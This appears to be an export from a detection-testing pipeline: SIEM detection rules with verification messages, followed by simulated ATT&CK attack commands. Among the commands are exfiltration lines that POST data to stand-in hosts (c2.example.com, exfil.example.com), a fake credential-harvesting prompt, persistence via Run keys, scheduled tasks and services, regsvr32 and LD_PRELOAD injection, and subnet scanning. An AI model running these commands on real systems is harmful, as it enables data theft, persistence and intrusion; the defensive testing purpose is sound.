rules.title: Suspicious Command Line Execution via cmd.exe with Malicious Patterns
rules.description: Detects suspicious command-line activity using cmd.exe with patterns commonly associated with malicious behavior such as encoded commands, script execution, or use of utilities like certutil for data decoding.
falsepositives: Legitimate administrative scripts that use certutil or wmic for system management
Software installers or deployment tools that invoke scripts via cmd.exe
User-initiated command-line tasks involving encoded data or automation

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detection of User Execution via Social Engineering
rules.description: This rule detects the execution of malware by users due to social engineering attacks, as described in MITRE ATT&CK technique T1204 (User Execution). It focuses on the execution of suspicious commands or scripts by legitimate user processes.
falsepositives: Legitimate administrative tasks using powershell.exe or cmd.exe
Software installation processes
Script execution for automated system tasks

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Create or Modify System Process via NLP Pattern Matching
rules.description: Detects Create or Modify System Process activity via NLP pattern matching
falsepositives: Legitimate system administration tasks
Software installation or updates

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Registry Modification for Persistence via Run Keys
rules.description: Detects modification of Windows registry Run or RunOnce keys commonly used for persistence. This rule identifies process executions that attempt to write to high-risk registry paths associated with startup execution.

detection.condition: (selection_reg or selection_powershell) and selection_path and User not in ('NT AUTHORITY\\SYSTEM', 'SYSTEM')

falsepositives: Legitimate software installations that add entries to Run keys
Administrative scripts that configure user startup settings
System management tools that modify registry for configuration

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Process Injection via Office Parent Processes and Suspicious Loaders
rules.description: Detects process injection attempts where Office applications spawn rundll32.exe or powershell.exe with suspicious command‑line arguments, or where rundll32.exe loads a DLL or JavaScript payload.

detection.condition: selection1 or selection2 or selection3 or selection4

falsepositives: Legitimate Office macros or add‑ins that launch PowerShell for automation.
System administration scripts that use rundll32.exe to run legitimate DLLs.
Scheduled tasks or software installers that invoke PowerShell with encoded commands for legitimate purposes.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Exploitation of Remote Services via Suspicious Command Line
rules.description: Detects exploitation of remote services by identifying suspicious command line activity indicative of potential initial access attempts
falsepositives: Legitimate administrative tasks
Penetration testing activities

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious Application Layer Protocol Activity via Behavioral Indicators
rules.description: Detects suspicious application layer protocol activity by identifying anomalous User-Agent strings, encoded command-line parameters, and process behaviors indicative of command and control over HTTP/HTTPS.
falsepositives: Legitimate use of PowerShell with encoded commands by system administrators
Automated scripts using curl or python-requests for API calls
Internal monitoring tools sending POST requests with minimal User-Agent strings

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Obfuscated Files or Information Detection
rules.description: Detects obfuscated files or information using NLP pattern matching and known obfuscation indicators
falsepositives: Legitimate system administration tasks using PowerShell
Software installations or updates using encoded commands

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Exfiltration Over C2 Channel via PowerShell with Encoded Command
rules.description: Detects potential exfiltration over C2 channel using PowerShell with encoded commands and high-entropy arguments, often indicative of data staging or transmission over C2.

detection.condition: selection and high_entropy and not parent_exclusion

falsepositives: Administrative scripts using base64-encoded commands in non-interactive contexts
Software deployment tools invoking PowerShell with encoded arguments
PowerShell Empire or similar legitimate red team tools (if used in environment)

siem_verification.message: Invalid SPL: Error in 'SearchOperator:regex': Usage: regex <field> (=|!=) <regex>.

rules.title: Data Collection from Local System
rules.description: Detects potential data collection from the local system by monitoring process creation events
falsepositives: Legitimate administrative tasks
Scripted operations for system maintenance
Software installations or updates

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Remote Services Lateral Movement via Remote Administration Tools
rules.description: Detects execution of remote service tools commonly used for lateral movement, such as PsExec, WMIC, SSH, PowerShell remoting, and RDP, especially when connecting to external (non‑internal) IP addresses.

detection.condition: (selection_ps or selection_wmic or selection_ssh or selection_mstsc or selection_psremoting) and not (internal_ip or internal_ip2 or internal_ip3)

falsepositives: Legitimate administrative use of PsExec, WMIC, SSH, or RDP within the internal network
PowerShell scripts that use -EncodedCommand for automation in trusted environments
System administrators connecting to internal servers via mstsc.exe

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Phishing: Office Application Launching Suspicious Child Process
rules.description: Detects Office applications (e.g., winword.exe) spawning processes with command lines indicative of malicious payload execution, commonly seen in phishing attacks.
falsepositives: Legitimate use of Office documents to launch scripts via command-line tools (rare in most environments)
Administrative or helpdesk tools embedded in Office documents for user support

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Archive Collected Data Detection
rules.description: Detects Archive Collected Data activity via NLP pattern matching
falsepositives: Legitimate use of archive tools by system administrators
Compressing files for backup purposes

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Network Service Scanning Detected via Command-Line Tools
rules.description: Detects potential network service scanning activity by identifying execution of known scanning tools (e.g., nmap, netcat) with suspicious command-line arguments indicative of port scanning.
falsepositives: Legitimate network troubleshooting by system administrators using tools like nmap or netcat
Automated IT management tasks that perform connectivity checks
Security assessment tools running in the environment with elevated privileges

siem_verification.message: Verification complete

rules.title: Suspicious Process Creation Indicative of Privilege Escalation Exploit
rules.description: Detects execution of known privilege escalation exploit tools such as PrintSpoofer, JuicyPotato, or similar binaries via command-line patterns and parent-child process relationships.
falsepositives: Authorized penetration testing or red team operations using exploit tools
Administrative scripts that mimic exploit-like behavior (rare)
Custom internal tools named similarly to known exploits

siem_verification.message: Verification complete

rules.title: Ingress Tool Transfer via Common Windows Utilities
rules.description: Detects execution of certutil.exe, bitsadmin.exe, or PowerShell commands that download tools from remote URLs, including parent‑child anomalies indicative of tool transfer.

detection.condition: selection_certutil or selection_bitsadmin or selection_powershell or selection_parent_child

falsepositives: Legitimate use of certutil.exe for certificate management
Bitsadmin.exe used by administrators for legitimate file transfers
PowerShell scripts that download updates or packages from trusted sources
System maintenance tasks that invoke these utilities with URLs

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detect Data Encoding Commands Used for Exfiltration (T1027)
rules.description: Detects execution of encoding utilities and PowerShell base64 encoding flags that may indicate data being prepared for exfiltration.
falsepositives: Legitimate use of certutil for certificate management or file encoding/decoding by administrators.
PowerShell scripts that legitimately use -EncodedCommand or -enc for automation.
Developers or sysadmins running base64 encoding/decoding commands in scripts or build processes.

siem_verification.message: Verification complete

rules.description: Detects modification of Windows Registry Run keys for persistence using command-line tools.
falsepositives: Legitimate software installations that add startup entries via reg.exe
Administrative scripts configuring user or system startup programs

attacks.description: Basic command execution using cmd.exe to write a test string to a temporary file
attacks.expected_behavior: Creates a file 'test_output.txt' in the user's temp directory with the content 'HelloFromCmd'. No elevated privileges needed. Safe and reversible.

attacks.description: Intermediate attack using certutil to download a file from a remote server and execute it via cmd
attacks.expected_behavior: Attempts to download a file from http://example.com/test.bin to the temp directory. Since the URL is benign and non-functional for payload delivery, no actual malware is transferred. Execution of the downloaded file would fail safely. Uses only built-in Windows tools.

attacks.command: powershell -Command "try { $cmd = 'cmd.exe /c echo TestExecution'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); Start-Process powershell.exe -ArgumentList '-EncodedCommand', $encoded } catch { }"
attacks.description: Advanced attack using PowerShell to encode and execute a command via Base64, simulating obfuscation techniques
attacks.expected_behavior: Encodes a simple echo command in Base64 using UTF-16LE (Unicode), then spawns a new PowerShell process to execute it. This mimics common obfuscation tactics. No harmful payload is used. The command runs in a separate process and outputs text to console (if visible). Safe for isolated testing.

attacks.description: Basic command execution using shell interpreter to create and run a script file.
attacks.expected_behavior: Creates a hidden file in /tmp, makes it executable, and attempts to run it. Fails silently if script is non-executable or malformed, but file remains.

attacks.command: bash -c 'for i in {1..3}; do echo "Attempt $i from $(hostname) at $(date)" >> /tmp/debug.log; sleep 2; done'
attacks.description: Intermediate use of bash to log simulated beaconing activity to a file.
attacks.expected_behavior: Appends timestamped entries to /tmp/debug.log every 2 seconds. Simulates periodic command execution. File persists after execution.

attacks.command: sh -c 'if [ -f /tmp/stage.sh ]; then . /tmp/stage.sh; else echo "echo \"PERSISTED COMMAND\"" > /tmp/stage.sh && chmod +x /tmp/stage.sh; fi'
attacks.description: Advanced command using shell logic to conditionally execute or drop a script file.
attacks.expected_behavior: Checks for existence of /tmp/stage.sh. If present, sources and runs it. If not, creates it with a simple echo command and makes it executable. Demonstrates logic and persistence setup without actual payload.

attacks.description: Basic user execution: directly launching a legitimate Windows binary (Calculator) to simulate user-triggered execution.
attacks.expected_behavior: Calculator application launches immediately. This simulates an attacker tricking a user into running a seemingly harmless program that could be replaced with malware.

attacks.description: Intermediate user execution: download and execute a file using certutil (built-in downloader) and run it from temp directory.
attacks.expected_behavior: certutil attempts to download a file (benign URL used for testing), then executes it locally. In a real attack, this would be malware. Here, the URL is non-functional to prevent unintended downloads.

attacks.description: Advanced user execution: create a malicious shortcut with encoded PowerShell command, simulating a phishing lure.
attacks.expected_behavior: Creates a directory and a shortcut file that, when clicked, runs a Base64-encoded PowerShell command (decodes to 'wigow.exe'; benign placeholder). This mimics a common social engineering tactic using LNK files in email attachments.

attacks.description: Download and execute a script from a remote server using common Linux tools
attacks.expected_behavior: Downloads a script to a hidden directory in user's home, makes it executable, and runs it. In a real attack, the script would contain malicious payload; here, it would execute benign or test code if present.

attacks.description: Execute a base64-encoded command stream using shell interpretation
attacks.expected_behavior: Decodes a base64 string (which could contain commands like network connections or script execution) and passes it to the shell. The example decodes to harmless text, but in real scenarios could execute malicious code.

attacks.command: mkdir -p $TMPDIR/.tmp && cp /tmp/payload.tar.gz $TMPDIR/.tmp/ && cd $TMPDIR/.tmp && tar -xzf payload.tar.gz && chmod +x ./update && ./update
attacks.description: Extract and execute a compressed executable from a tar archive in a temporary directory
attacks.expected_behavior: Copies a tar.gz archive to a hidden temp directory, extracts it, sets execute permissions on a contained file, and runs it. Simulates execution of a trojanized update script delivered via social engineering.

attacks.command: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateCheck" /t REG_SZ /d "cmd.exe /c echo Running at startup & exit" /f
attacks.description: Adds a registry entry to execute a command at user logon using the Run key.
attacks.expected_behavior: Command adds a persistent entry to the current user's Run key. On next logon, cmd.exe will execute the echo command silently and exit.

attacks.command: schtasks.exe /create /tn "SystemMaintenance" /tr "cmd.exe /c echo Maintenance running & exit" /sc onlogon /ru $env:USERNAME /f
attacks.description: Creates a scheduled task that runs a command each time the user logs on.
attacks.expected_behavior: A scheduled task named 'SystemMaintenance' is created and triggers on user logon. It runs a benign echo command and exits. No elevated privileges are required for current user tasks.

attacks.command: sc.exe create "AppHelperService" binPath= "cmd.exe /c echo Service started & sleep 5 & echo Service exiting" obj= "LocalSystem" start= auto & sc.exe start "AppHelperService"
attacks.description: Creates and starts a Windows service that runs a command with SYSTEM privileges.
attacks.expected_behavior: A new Windows service named 'AppHelperService' is created and started. It runs a simple echo command, waits 5 seconds, then exits. Requires administrator privileges to create and start system services. The service is set to start automatically at boot.

attacks.description: Append test command to user's bashrc for persistence
attacks.expected_behavior: Adds a line to ~/.bashrc that writes to /tmp/persistence_test on each shell login

attacks.description: Create user-level cron job for每分钟 file touch
attacks.expected_behavior: Adds cron job that touches /tmp/cron_persist every minute using user's crontab

attacks.description: Create and enable systemd service for boot persistence
attacks.expected_behavior: Creates systemd service file and enables it to execute on boot, requiring root privileges

attacks.description: Abuse of rundll32.exe to execute JavaScript via a trusted Microsoft binary, simulating reflective loading and process injection.
attacks.expected_behavior: rundll32.exe spawns and attempts to execute a JavaScript snippet that uses ActiveXObject to launch calc.exe. This mimics code injection into a trusted process. No actual injection occurs, but the command chain is commonly seen in evasion techniques.

attacks.description: Use regsvr32.exe to execute JavaScript from a command-line hosted script, simulating DLL sideloading and process injection via a Microsoft-signed binary.
attacks.expected_behavior: regsvr32.exe silently loads a script that runs a command to write a benign test file in %TEMP%. This emulates code execution in the context of a trusted process, often used to bypass application control and AV.

attacks.command: powershell -Command "try { $content = '<script>new ActiveXObject(\'WScript.Shell\').Run(\'cmd.exe /c echo simulated injection > %TEMP%\\sim_inject.txt\');</script>'; $path = "$env:TEMP\\fake.sct"; $content | Out-File -FilePath $path -Encoding ASCII -Force; regsvr32.exe /s /n /u /i:$path scrobj.dll } catch { } finally { Remove-Item $path -ErrorAction SilentlyContinue }"
attacks.description: Advanced simulation of process injection by dynamically generating a scriptlet (.sct) file and executing it via regsvr32.exe to run a command in a trusted process context.
attacks.expected_behavior: PowerShell writes a simple scriptlet to %TEMP%, invokes it via regsvr32.exe (a Microsoft-signed binary), which executes the embedded command to create a test file. The file is then cleaned up. This mimics advanced evasion techniques where attackers avoid direct payload drops.

attacks.command: echo 'int main() { return 0; }' > /tmp/test.c && gcc -fPIC -shared -o /tmp/libtest.so /tmp/test.c && LD_PRELOAD=/tmp/libtest.so /bin/bash -c 'echo injected'
attacks.description: Basic LD_PRELOAD injection to simulate library injection into a new process.
attacks.expected_behavior: Compiles a dummy shared library and preloads it into a bash process, simulating a basic process injection via environment variable.

attacks.command: mkdir -p /tmp/inj && echo 'void __attribute__((constructor)) init() { system("echo 'injected via constructor' > /tmp/inj/log"); }' > /tmp/inj/lib.c && gcc -fPIC -shared -o /tmp/inj/libmal.so /tmp/inj/lib.c && LD_PRELOAD=/tmp/inj/libmal.so /usr/bin/env
attacks.description: Intermediate technique using a shared library with a constructor function that executes on load, simulating stealthier injection.
attacks.expected_behavior: Creates a shared library that logs a message when loaded via LD_PRELOAD, demonstrating a self-executing payload upon process initialization without explicit function calls.

attacks.command: sudo ptrace -p $(pgrep -n bash) 2>/dev/null || echo 'ptrace requires root and debug permissions; simulation skipped'
attacks.description: Advanced process injection simulation using ptrace to attach to a running process, representing direct memory manipulation attempts.
attacks.expected_behavior: Attempts to attach to a running bash process using ptrace; if successful, could allow memory reading/writing, but here only tests attachment capability for red team validation.

attacks.description: Attempts to establish an SMB session to the IPC$ share using default admin credentials, simulating brute-force or credential reuse against exposed services.
attacks.expected_behavior: Establishes a null session or prompts for credentials if authentication fails. No persistent changes made.

attacks.description: Attempts to reconfigure the Spooler service on the local system to run as LocalSystem with empty password, simulating privilege escalation via service modification.
attacks.expected_behavior: Fails without admin rights; with admin rights, modifies service configuration. Operation is reversible by system policies.

attacks.description: Simulates execution of a command via encoded PowerShell, mimicking how an attacker might obfuscate payload execution after exploiting a remote service.
attacks.expected_behavior: Starts a new PowerShell process that runs 'whoami /all' and exits. No malicious payload is used; encoding is for simulation only.

attacks.description: Basic SSH connection attempt to test remote access using a non-interactive login with a benign command.
attacks.expected_behavior: Attempts to connect to SSH service on 192.168.1.100. If credentials are valid, runs 'echo test'. Otherwise, fails silently after timeout.

attacks.command: nmap -p 22,80,443,8080 --open -oG - 192.168.1.0/24 | grep open | cut -d '/' -f 1 | xargs -I {} sh -c 'echo "Scanning {}"; nc -zv {} 22 && echo "Target {} may be exploitable via SSH"'
attacks.description: Intermediate scan of common remote service ports across a subnet, followed by targeted connectivity checks to identify potential exploitation targets.
attacks.expected_behavior: Discovers live hosts with open ports 22,80,443,8080. For each host with an open port, checks SSH accessibility. Outputs potential targets for exploitation.

attacks.description: Advanced simulation of remote exploit delivery via netcat to a listening service, emulating post-exploitation access.
attacks.expected_behavior: Sends a benign string to port 4444 on 192.168.1.100. If a netcat listener is active, the string is received. Used to simulate command delivery post-exploitation.

attacks.description: Download a file over HTTP using certutil, a built-in Windows binary often abused for exfiltration or beaconing.
attacks.expected_behavior: Sends an HTTP GET request to example.com, downloads test.txt, and saves it to the TEMP directory. No payload is malicious; connection will fail or return benign content.

attacks.command: powershell -Command "try { $web = New-Object Net.WebClient; $web.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'); $data = $web.DownloadString('http://example.com/beacon'); Set-Content -Path '%TEMP%\beacon_cache.txt' -Value $data -Force } catch { }"
attacks.description: Use PowerShell WebClient to simulate beaconing behavior over HTTP with custom headers, mimicking C2 traffic.
attacks.expected_behavior: Attempts to download a string from example.com with a browser-like User-Agent. Stores result in TEMP. Will fail silently if unreachable. No harmful action taken.

attacks.command: powershell -Command "try { $cmd = 'cmd.exe /c echo C2_Sync & timeout /t 5'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); Start-Process powershell -ArgumentList '-EncodedCommand', $encoded -WindowStyle Hidden } catch { }"
attacks.description: Simulate encoded C2 command execution over application layer protocol by launching an obfuscated, base64-encoded command.
attacks.expected_behavior: Encodes a harmless command (echo + delay), then executes it via a new hidden PowerShell process. Mimics use of encoded commands in C2 traffic. No network activity generated directly, but pattern resembles protocol-based command delivery.

attacks.description: Basic HTTP GET request to simulate beaconing to a C2 server
attacks.expected_behavior: Sends a GET request to localhost on port 8080; fails silently if no service is listening

attacks.description: Intermediate HTTP POST with custom headers and system data exfiltration simulation
attacks.expected_behavior: Sends a POST request with system info to localhost; output suppressed to /dev/null

attacks.description: Advanced reverse shell using netcat and FIFO for persistent C2 communication
attacks.expected_behavior: Creates a reverse shell pipeline to localhost:4444; will block until a connection is made

attacks.description: Basic obfuscation using hex-encoded data in a file, decoded using certutil (a built-in Windows binary).
attacks.expected_behavior: Creates a hex-encoded test file in %TEMP%, then decodes it to a binary file using certutil. The content is benign (partial MZ header). No network activity or privilege escalation occurs.

attacks.description: Intermediate obfuscation using Base64-encoded PowerShell script, decoded and executed via certutil and powershell.
attacks.expected_behavior: Writes a Base64-encoded benign PowerShell script to %TEMP%, decodes it using certutil, and executes it. Output is 'Hello World'. The script does not persist or connect externally.

attacks.command: powershell -Command "try { $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Host \"Obfuscated command execution\" -ForegroundColor Green')); Start-Process powershell -ArgumentList '-EncodedCommand', $enc -WindowStyle Hidden } catch { exit 1 }"
attacks.description: Advanced obfuscation using PowerShell to generate and execute an encoded command with hidden window style.
attacks.expected_behavior: Generates a Base64-encoded Unicode PowerShell command that displays a message in green text, then executes it in a hidden window. The encoded command is not logged in plaintext in command history. No file is written to disk.

attacks.description: Basic obfuscation using Base64-encoded command executed via pipe to bash
attacks.expected_behavior: Decodes the Base64 string 'echo payload file' and executes it, printing 'payload file' to stdout

attacks.description: Intermediate obfuscation using Base64-encoded command stored in variable and executed via eval
attacks.expected_behavior: Decodes and runs 'echo stage 1 done', outputting the message to the terminal

attacks.description: Advanced obfuscation using environment variable to store Base64-decoded command, then executed via bash
attacks.expected_behavior: Sets an environment variable with the decoded value 'echo final stage work\n' and executes it, printing the message and a newline

attacks.description: Basic exfiltration using gzip compression and curl POST
attacks.expected_behavior: Compresses /etc/passwd into /tmp/data.gz and exfiltrates via HTTP POST to example.com, then cleans up temporary file

attacks.command: tar cf - /var/log | openssl enc -aes-256-cbc -pass pass:test123 | curl -X POST -H 'Content-Type: application/octet-stream' --data-binary @- http://c2.example.com:8080/logs
attacks.description: Intermediate exfiltration with OpenSSL encryption via C2 channel
attacks.expected_behavior: Streams encrypted /var/log contents via POST request to C2 server using openssl encryption with test password

attacks.command: base64 /tmp/testfile | split -b 1000 - /tmp/chunk- && for f in /tmp/chunk-*; do curl -sS -F 'data=@$f' http://exfil.example.com/upload; done; rm /tmp/chunk-*
attacks.description: Advanced chunked exfiltration with base64 encoding
attacks.expected_behavior: Splits base64-encoded test file into 1000-byte chunks and exfiltrates sequentially via multipart form uploads

attacks.description: Basic system information gathering using built-in systeminfo binary
attacks.expected_behavior: Outputs detailed system information including OS version, hotfixes, and system uptime to stdout

attacks.description: Intermediate data collection: captures network configuration and local user accounts, saves to temp files, and displays content
attacks.expected_behavior: Creates two files in %TEMP% with network and user data, then outputs their contents to stdout. Uses standard Windows binaries and safe redirection.

attacks.command: powershell -Command "mkdir '%TEMP%\collection' -ErrorAction SilentlyContinue; ipconfig /all | Out-File -FilePath '%TEMP%\collection\net.txt'; systeminfo | Out-File -FilePath '%TEMP%\collection\sys.txt'; net user | Out-File -FilePath '%TEMP%\collection\users.txt'; Compress-Archive -Path '%TEMP%\collection\*' -DestinationPath '%TEMP%\data.zip' -Force -ErrorAction Stop; Remove-Item '%TEMP%\collection' -Recurse -Force -ErrorAction SilentlyContinue"
attacks.description: Advanced data collection: gathers multiple system artifacts, archives them into a ZIP file, and cleans up the working directory
attacks.expected_behavior: Creates a directory in %TEMP%, populates it with system data, compresses it into data.zip, and removes the directory. Uses only built-in PowerShell cmdlets with proper error handling and cleanup.

attacks.description: List files in common user data directories to identify potentially sensitive files.
attacks.expected_behavior: Outputs a directory listing of Documents and Downloads folders if they exist; suppresses errors for non-existent directories.

attacks.description: Search for configuration and environment files in a project directory and compress them into an archive.
attacks.expected_behavior: Finds files matching *.env or config.json in /home/user/Projects and creates a compressed tarball at /tmp/collected_data.tar.gz; errors are suppressed.

attacks.description: Establishes a network connection to a remote system's administrative share using valid credentials.
attacks.expected_behavior: Creates a mapped session to the remote C$ share if credentials are valid. No data is transferred unless explicitly accessed.

attacks.command: sc \\REMOTE-HOST create TestService binPath= "cmd.exe /c echo Test > %TEMP%\lateral_move_test.txt" start= auto && sc \\REMOTE-HOST start TestService
attacks.description: Creates and starts a service on a remote host using sc.exe to execute a benign command.
attacks.expected_behavior: Service 'TestService' is created and executed on the remote system, writing a test string to %TEMP%. The service will be visible in the services list and removed manually after testing.

attacks.command: powershell -Command "try { $cmd = 'echo LateralMoveTest > $env:TEMP\\remote_exec_test.txt'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); Invoke-Command -ComputerName REMOTE-HOST -ScriptBlock { param($e) powershell -EncodedCommand $e } -ArgumentList $encoded } catch { exit 1 }"
attacks.description: Executes a command on a remote system using PowerShell remoting (WinRM) with an encoded payload.
attacks.expected_behavior: Uses WinRM to run a command on the remote host that writes a test string to a file in the user's TEMP directory. Fails silently if WinRM is not enabled or access is denied.

attacks.description: Basic SSH command to execute 'id' on a remote host for testing connectivity and identity
attacks.expected_behavior: Connects to the remote host via SSH and runs the 'id' command, returning user and group information

attacks.description: Intermediate SSH command using a specified private key and disabling host key verification to simulate use of stolen credentials
attacks.expected_behavior: Uses a specific SSH key to authenticate and runs a benign echo command on the remote system; disables host key check to avoid prompts

attacks.description: Advanced SSH command to create a local port forward through a jump host for lateral movement and internal service access
attacks.expected_behavior: Establishes an SSH tunnel that forwards local port 8080 to port 80 on a internal host via the remote system, enabling access to internal services

attacks.description: Simulates downloading a phishing-attached file using built-in certutil utility
attacks.expected_behavior: Downloads a file from a remote server to the user's temp directory. Uses benign URL and writes to a safe location. No execution occurs.

attacks.command: echo Write-Output 'This is a test document.' > "%TEMP%\invoice.txt" && cmd.exe /c "%TEMP%\invoice.txt"
attacks.description: Simulates opening a malicious text file that executes commands via cmd (basic macro/script emulation)
attacks.expected_behavior: Creates a text file with benign content in temp directory and attempts to 'execute' it via cmd, which will only display the content. Mimics double-clicking a file with dangerous extension like .vbs or .js.

attacks.description: Simulates execution of a decoded PowerShell script from a phishing attachment
attacks.expected_behavior: Creates a subdirectory in temp, writes a PowerShell script that decodes and executes a benign Base64 string (outputting 'Header block'), then runs it. Uses standard cmdlets and avoids .NET direct invocation. Directory creation includes error suppression for robustness.

attacks.description: Downloads and prepares a fake update script from a phishing URL
attacks.expected_behavior: Downloads a file from example.com and makes it executable, simulating common phishing payload delivery.

attacks.command: echo 'Please update your account at http://phish.example.com/login' | mail -s 'Account Update Required' user@localhost
attacks.description: Sends a phishing email to a local user prompting for account update
attacks.expected_behavior: Triggers mail delivery with a phishing link to the local user, mimicking email-based phishing.

attacks.command: read -p 'Username: ' user && read -sp 'Password: ' pass && echo "Phishing captured: $user:$pass" >> ~/.phish.log
attacks.description: Interactive credential harvesting via fake prompt
attacks.expected_behavior: Prompts user for credentials and stores them in ~/.phish.log, simulating credential harvesting.

attacks.description: Uses built-in makecab utility to compress a collected data file into a cabinet archive.
attacks.expected_behavior: Creates a compressed cabinet file named archive_.cab in the TEMP directory from sensitive_data.txt. If the source file does not exist, an error is displayed but no harm occurs.

attacks.description: Uses PowerShell Compress-Archive to bundle collected logs into a ZIP file.
attacks.expected_behavior: Creates logs.zip in TEMP containing collected_logs.txt. If source file is missing, compression fails silently. Uses -Force to overwrite existing archive.

attacks.description: Creates a directory with collected data, archives it, then removes the original folder.
attacks.expected_behavior: Copies a local file to a temporary folder, compresses the folder into data_archive.zip, and deletes the original directory. All operations occur in TEMP. Harmless if source file doesn't exist.

attacks.description: Basic: Archive /var/log contents into compressed tarball
attacks.expected_behavior: Creates compressed archive of system logs in /tmp/collected_data.tar.gz. Requires root to access protected log files.

attacks.description: Intermediate: Collect text files from user home directories
attacks.expected_behavior: Recursively finds .txt files in /home directories and adds them to /tmp/docs.tar.gz. Runs without elevation.

attacks.description: Advanced: Create encrypted archive of system logs
attacks.expected_behavior: Creates GPG-encrypted archive of /var/log using test password. Outputs encrypted /tmp/logs.gpg file.

attacks.description: Lists all listening network ports and services using built-in netstat and findstr.
attacks.expected_behavior: Displays active listening ports on the system without requiring elevated privileges. Safe and commonly used for network discovery.

attacks.description: Performs a ping sweep of the 192.168.1.0/24 network to identify live hosts using built-in ping and findstr.
attacks.expected_behavior: Sends one ICMP packet to each IP in the subnet and prints replies. Minimal network impact and safe for testing.

attacks.command: powershell -Command "for ($i = 1; $i -le 10; $i++) { $socket = New-Object System.Net.Sockets.TcpClient; try { $socket.Connect('192.168.1.1', $i); Write-Output "Port $i is open" } catch { } finally { $socket.Close() } }"
attacks.description: Performs a basic TCP port scan on the first 10 ports of 192.168.1.1 using PowerShell.
attacks.expected_behavior: Attempts TCP connections to ports 1-10 on 192.168.1.1 and outputs open ports. Uses only built-in .NET classes via PowerShell, no reflection. Safe due to limited scope.

attacks.description: List all listening TCP and UDP ports on the local system using the ss command
attacks.expected_behavior: Outputs a list of open network ports and associated services on the local machine. Runs quickly and produces minimal noise. Does not connect to remote systems.

attacks.description: Use netcat to check if port 22 (SSH) is open on localhost
attacks.expected_behavior: Attempts to connect to port 22 on localhost and reports success or failure. Generates a single connection attempt and outputs result to stdout.

attacks.description: Run a service version detection scan against common ports on a local network host
attacks.expected_behavior: Performs targeted service fingerprinting on ports 22, 80, and 443 of a local IP address. Outputs detected service versions. Requires root privileges for full accuracy but may run partially without them.

attacks.description: Simulates exploitation of a service with a writable binPath by reconfiguring it to execute a benign command.
attacks.expected_behavior: Modifies the binary path of a service to run 'whoami' and write output to a temp file. Requires administrator privileges to change service configuration. No actual exploit is performed.

attacks.command: cmd.exe /c echo Exploit placeholder: CVE-2023-1234 emulation > %TEMP%\exploit_simulation.txt
attacks.description: Simulates writing an exploit payload to disk in a typical location, using only built-in commands.
attacks.expected_behavior: Creates a benign text file in the temp directory indicating exploit simulation. No actual vulnerability is exploited.

attacks.command: powershell -Command "try { $content = 'Simulated exploit stub'; $path = [System.IO.Path]::Combine($env:TEMP, 'payload.bin'); $content | Out-File -FilePath $path -Encoding ASCII -Force } catch { }"
attacks.description: Simulates dropping a binary payload to disk using PowerShell with error suppression and proper path handling.
attacks.expected_behavior: Writes a benign simulated payload file to the temp directory. Uses PowerShell with error handling and built-in environment variables. No actual malicious content is written.

attacks.description: Compile and execute a local privilege escalation exploit from C source (simulated).
attacks.expected_behavior: Compiles a C file named /tmp/exploit.c (if present) and runs it. In testing, this would be a benign stub. No actual exploit is included.

attacks.command: echo 'echo \"Exploit triggered - privilege escalation attempt\"' > /tmp/stage.sh && chmod +x /tmp/stage.sh && /tmp/stage.sh
attacks.description: Simulate execution of an exploit script that performs privilege escalation (benign version).
attacks.expected_behavior: Creates a script in /tmp that prints a test message and executes it. No actual privilege escalation occurs.

attacks.description: Download a file using certutil, a built-in Windows utility often abused for file transfer.
attacks.expected_behavior: Downloads a file from the specified URL and saves it as update.exe in the user's TEMP directory. Displays progress and certificate info unless suppressed.

attacks.description: Use BITSAdmin to silently download a file in the background, a common technique to evade detection.
attacks.expected_behavior: Queues a download job via the Background Intelligent Transfer Service. The file agent.exe is saved to the TEMP directory upon completion. The transfer runs asynchronously and is less likely to trigger real-time alerts.

attacks.description: PowerShell-based file download using WebClient, simulating transfer of a binary tool.
attacks.expected_behavior: Downloads a file from the specified URL to the TEMP directory using PowerShell. Errors are suppressed. No external tools or modules are required. Uses built-in .NET WebClient via PowerShell Cmdlet-style invocation, not direct .NET reflection.

attacks.description: Download a binary tool from internal server and make it executable
attacks.expected_behavior: Silently downloads a file named tool.bin to /tmp and sets execute permissions. Simulates transfer of executable tool.

attacks.description: Stream and extract a compressed tool archive from remote server
attacks.expected_behavior: Downloads a gzipped tar archive via curl and extracts it directly into /tmp. Simulates transfer of multiple tools or a full toolkit.

attacks.description: Decode and write a base64-encoded script to disk, simulating inline payload delivery
attacks.expected_behavior: Decodes a base64 string containing a benign shell script and saves it as /tmp/tool.sh with execute permissions. Represents obfuscated tool transfer without network retrieval.

attacks.description: Basic data encoding using base64 on a test string
attacks.expected_behavior: Outputs 'dGVzdF9kYXRhX2Zvcl9leGZpbHRyYXRpb24K' to stdout, which is the base64 encoding of the input string

attacks.description: Intermediate: Create dummy data, compress into tar.gz, then encode with base64
attacks.expected_behavior: Creates a temporary directory with dummy files, compresses them into a gzipped tar archive, then outputs the base64-encoded content of the archive to stdout

